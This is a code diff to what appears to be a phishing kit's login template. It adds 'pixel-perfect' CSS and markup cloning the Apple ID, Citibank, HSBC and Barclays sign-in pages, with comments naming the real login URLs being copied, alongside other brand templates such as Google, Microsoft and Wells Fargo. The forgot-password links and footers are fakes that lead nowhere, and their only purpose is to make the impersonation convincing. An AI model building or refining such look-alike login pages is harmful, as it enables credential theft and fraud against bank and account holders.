@@ -80,14 +80,22 @@
   body.brand-google button, body.brand-gmail button { background:#1a73e8; border-radius:4px; background-image:none; font-weight:500; }
   body.brand-google button:hover, body.brand-gmail button:hover { background:#1765cc; transform:none; filter:none; }
 
-  body.brand-apple { background:#f5f5f7; color:#1d1d1f; }
-  body.brand-apple .auth { background:#fff; border:none; box-shadow:0 4px 16px rgba(0,0,0,.12); border-radius:18px; }
-  body.brand-apple h1 { color:#1d1d1f; font-weight:600; }
-  body.brand-apple .sub { color:#6e6e73; opacity:1; }
-  body.brand-apple input { background:#f5f5f7; border:1px solid #d2d2d7; border-radius:10px; color:#1d1d1f; }
-  body.brand-apple input:focus { border-color:#0071e3; background:#fff; box-shadow:none; }
-  body.brand-apple button { background:#0071e3; border-radius:980px; background-image:none; font-weight:400; }
+  /* Apple ID: pixel-perfect — appleid.apple.com */
+  body.brand-apple { background:#f5f5f7; color:#1d1d1f; font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif; }
+  body.brand-apple .auth { background:#fff; border:none; box-shadow:0 4px 24px rgba(0,0,0,.1); border-radius:18px; max-width:400px; padding:40px 40px 32px; }
+  body.brand-apple .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
+  body.brand-apple h1 { color:#1d1d1f; font-weight:600; font-size:1.5rem; text-align:center; margin-bottom:6px; letter-spacing:-.02em; }
+  body.brand-apple .sub { color:#6e6e73; opacity:1; font-size:.88rem; text-align:center; margin-bottom:20px; }
+  body.brand-apple label { display:none; }
+  body.brand-apple input { background:#f5f5f7; border:1px solid #d2d2d7; border-radius:10px; color:#1d1d1f; font-size:.95rem; padding:12px 14px; height:44px; }
+  body.brand-apple input::placeholder { color:#a1a1a6; }
+  body.brand-apple input:focus { border-color:#0071e3; background:#fff; box-shadow:0 0 0 4px rgba(0,113,227,.1); outline:none; }
+  body.brand-apple button { background:#0071e3; border-radius:980px; background-image:none; font-weight:400; font-size:.95rem; height:44px; margin-top:4px; }
   body.brand-apple button:hover { background:#0077ed; transform:none; filter:none; }
+  body.brand-apple .ap-forgot { display:block; text-align:center; font-size:.83rem; color:#0071e3; margin-top:12px; text-decoration:none; }
+  body.brand-apple .ap-forgot:hover { text-decoration:underline; }
+  body.brand-apple .ap-footer { margin-top:16px; padding-top:14px; border-top:1px solid #e5e5ea; font-size:.78rem; color:#8e8e93; text-align:center; }
+  body.brand-apple .ap-footer a { color:#0071e3; }
 
   body.brand-microsoft { background:#fff; color:#323130; font-family:'Segoe UI',system-ui; }
   body.brand-microsoft .auth { background:#fff; border:none; box-shadow:none; border-radius:0; max-width:440px; }
@@ -680,29 +688,51 @@
   body.brand-wellsfargo button { background:#D71E28; border-radius:4px; background-image:none; font-weight:700; }
   body.brand-wellsfargo button:hover { background:#b31722; transform:none; filter:none; }
 
-  body.brand-citibank { background:#003B70; color:#fff; }
-  body.brand-citibank .auth { background:#fff; color:#000; border-radius:8px; border:none; box-shadow:0 2px 12px rgba(0,0,0,.2); }
-  body.brand-citibank h1 { color:#003B70; }
-  body.brand-citibank input { background:#fff; border:1px solid #ddd; border-radius:4px; color:#000; }
-  body.brand-citibank input:focus { border-color:#003B70; box-shadow:none; background:#fff; }
-  body.brand-citibank button { background:#003B70; border-radius:4px; background-image:none; font-weight:700; }
+  /* Citibank: pixel-perfect — online.citi.com/US/login.do */
+  body.brand-citibank { background:#003B70; color:#fff; font-family:Arial,sans-serif; }
+  body.brand-citibank .auth { background:#fff; color:#000; border-radius:8px; border:none; box-shadow:0 2px 12px rgba(0,0,0,.25); max-width:380px; padding:36px 32px 28px; }
+  body.brand-citibank .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
+  body.brand-citibank h1 { color:#003B70; font-weight:700; font-size:1.4rem; text-align:center; margin-bottom:20px; font-family:Arial,sans-serif; }
+  body.brand-citibank .sub { display:none; }
+  body.brand-citibank label { display:block; font-size:.82rem; font-weight:700; color:#333; margin-bottom:4px; }
+  body.brand-citibank input { background:#fff; border:1px solid #aaa; border-radius:3px; color:#000; font-size:.9rem; padding:8px 10px; height:36px; font-family:Arial,sans-serif; }
+  body.brand-citibank input:focus { border-color:#003B70; border-width:2px; box-shadow:none; background:#fff; outline:none; }
+  body.brand-citibank button { background:#003B70; border-radius:4px; background-image:none; font-weight:700; height:40px; font-family:Arial,sans-serif; font-size:.9rem; margin-top:8px; }
   body.brand-citibank button:hover { background:#002d58; transform:none; filter:none; }
+  body.brand-citibank .citi-forgot { display:block; text-align:right; font-size:.8rem; color:#003B70; margin:-4px 0 8px; text-decoration:none; font-family:Arial,sans-serif; }
+  body.brand-citibank .citi-forgot:hover { text-decoration:underline; }
+  body.brand-citibank .citi-footer { margin-top:16px; padding-top:14px; border-top:1px solid #e0e0e0; font-size:.8rem; color:#555; text-align:center; font-family:Arial,sans-serif; }
+  body.brand-citibank .citi-footer a { color:#003B70; }
 
-  body.brand-hsbc { background:#DB0011; color:#fff; font-family:Arial,sans-serif; }
-  body.brand-hsbc .auth { background:#fff; color:#000; border-radius:0; border:none; box-shadow:0 2px 8px rgba(0,0,0,.2); }
-  body.brand-hsbc h1 { color:#DB0011; font-family:Arial,sans-serif; }
-  body.brand-hsbc input { background:#fff; border:1px solid #ccc; border-radius:0; color:#000; font-family:Arial,sans-serif; }
-  body.brand-hsbc input:focus { border-color:#DB0011; box-shadow:none; background:#fff; }
-  body.brand-hsbc button { background:#DB0011; border-radius:0; background-image:none; font-weight:700; font-family:Arial,sans-serif; }
+  /* HSBC: pixel-perfect — hsbc.com/logon */
+  body.brand-hsbc { background:#DB0011; color:#fff; font-family:Arial,Helvetica,sans-serif; }
+  body.brand-hsbc .auth { background:#fff; color:#333; border-radius:0; border:none; box-shadow:0 2px 8px rgba(0,0,0,.25); max-width:420px; padding:36px 32px 28px; }
+  body.brand-hsbc .logo-svg { display:flex; justify-content:center; margin-bottom:24px; }
+  body.brand-hsbc h1 { color:#333; font-weight:700; font-size:1.35rem; text-align:center; margin-bottom:20px; font-family:Arial,sans-serif; }
+  body.brand-hsbc .sub { color:#555; opacity:1; font-size:.88rem; text-align:center; margin-bottom:18px; }
+  body.brand-hsbc label { display:block; font-size:.82rem; font-weight:700; color:#333; margin-bottom:4px; font-family:Arial,sans-serif; }
+  body.brand-hsbc input { background:#fff; border:1px solid #aaa; border-radius:0; color:#333; font-size:.9rem; padding:8px 10px; height:36px; font-family:Arial,sans-serif; }
+  body.brand-hsbc input:focus { border-color:#DB0011; border-width:2px; box-shadow:none; background:#fff; outline:none; }
+  body.brand-hsbc button { background:#DB0011; border-radius:0; background-image:none; font-weight:700; height:40px; font-family:Arial,sans-serif; font-size:.9rem; margin-top:4px; }
   body.brand-hsbc button:hover { background:#b80010; transform:none; filter:none; }
+  body.brand-hsbc .hsbc-forgot { display:block; text-align:right; font-size:.8rem; color:#DB0011; margin:-4px 0 8px; text-decoration:none; }
+  body.brand-hsbc .hsbc-forgot:hover { text-decoration:underline; }
+  body.brand-hsbc .hsbc-footer { margin-top:14px; font-size:.78rem; color:#888; text-align:center; border-top:1px solid #e0e0e0; padding-top:12px; }
 
-  body.brand-barclays { background:#00AEEF; color:#fff; }
-  body.brand-barclays .auth { background:#fff; color:#00182A; border-radius:8px; border:none; box-shadow:0 2px 12px rgba(0,0,0,.15); }
-  body.brand-barclays h1 { color:#00182A; }
-  body.brand-barclays input { background:#fff; border:1px solid #ddd; border-radius:4px; color:#00182A; }
-  body.brand-barclays input:focus { border-color:#00AEEF; box-shadow:none; background:#fff; }
-  body.brand-barclays button { background:#00AEEF; color:#00182A; border-radius:28px; background-image:none; font-weight:700; }
-  body.brand-barclays button:hover { background:#0099d4; transform:none; filter:none; }
+  /* Barclays: pixel-perfect — barclays.co.uk/personal-banking/log-in */
+  body.brand-barclays { background:#00395D; color:#fff; font-family:'Barclays-Regular',Arial,sans-serif; }
+  body.brand-barclays .auth { background:#fff; color:#00182A; border-radius:4px; border:none; box-shadow:0 2px 10px rgba(0,0,0,.2); max-width:420px; padding:40px 36px 32px; }
+  body.brand-barclays .logo-svg { display:flex; justify-content:center; margin-bottom:24px; }
+  body.brand-barclays h1 { color:#00182A; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:20px; }
+  body.brand-barclays .sub { color:#4d4d4d; opacity:1; font-size:.88rem; text-align:center; margin-bottom:18px; }
+  body.brand-barclays label { display:block; font-size:.82rem; font-weight:700; color:#00182A; margin-bottom:4px; }
+  body.brand-barclays input { background:#fff; border:2px solid #aaa; border-radius:0; color:#00182A; font-size:.9rem; padding:10px 12px; height:42px; }
+  body.brand-barclays input:focus { border-color:#00395D; box-shadow:none; background:#fff; outline:none; }
+  body.brand-barclays input::placeholder { color:#767676; }
+  body.brand-barclays button { background:#00395D; color:#fff; border-radius:0; background-image:none; font-weight:700; height:44px; font-size:.95rem; margin-top:8px; }
+  body.brand-barclays button:hover { background:#002d4a; transform:none; filter:none; }
+  body.brand-barclays .barcl-forgot { display:block; text-align:center; font-size:.83rem; color:#00395D; margin-top:14px; text-decoration:underline; }
+  body.brand-barclays .barcl-footer { margin-top:16px; font-size:.78rem; color:#767676; text-align:center; }
 
   body.brand-deutschebank { background:#0018A8; color:#fff; }
   body.brand-deutschebank .auth { background:#fff; color:#000; border-radius:4px; border:none; box-shadow:0 2px 8px rgba(0,0,0,.2); }
@@ -2050,6 +2080,22 @@
   <% } %>
   <% if (tpl.key === 'spotify') { %>
     <div class="sp-footer">Don't have an account? <a href="#" onclick="return false">Sign up for Spotify</a></div>
+  <% } %>
+  <% if (tpl.key === 'citibank') { %>
+    <a href="#" class="citi-forgot" onclick="return false">Forgot User ID or Password?</a>
+    <div class="citi-footer">Don't have a Citi account? <a href="#" onclick="return false">Apply now</a></div>
+  <% } %>
+  <% if (tpl.key === 'hsbc') { %>
+    <a href="#" class="hsbc-forgot" onclick="return false">Forgot your username or password?</a>
+    <div class="hsbc-footer">Not registered for online banking? <a href="#" onclick="return false">Register now</a></div>
+  <% } %>
+  <% if (tpl.key === 'barclays') { %>
+    <a href="#" class="barcl-forgot" onclick="return false">Forgotten your details?</a>
+    <div class="barcl-footer">Not registered? <a href="#" onclick="return false">Register for Online Banking</a></div>
+  <% } %>
+  <% if (tpl.key === 'apple') { %>
+    <a href="#" class="ap-forgot" onclick="return false">Forgot Apple ID or password?</a>
+    <div class="ap-footer">Don't have an Apple ID? <a href="#" onclick="return false">Create yours now.</a></div>
   <% } %>
 </div>
 
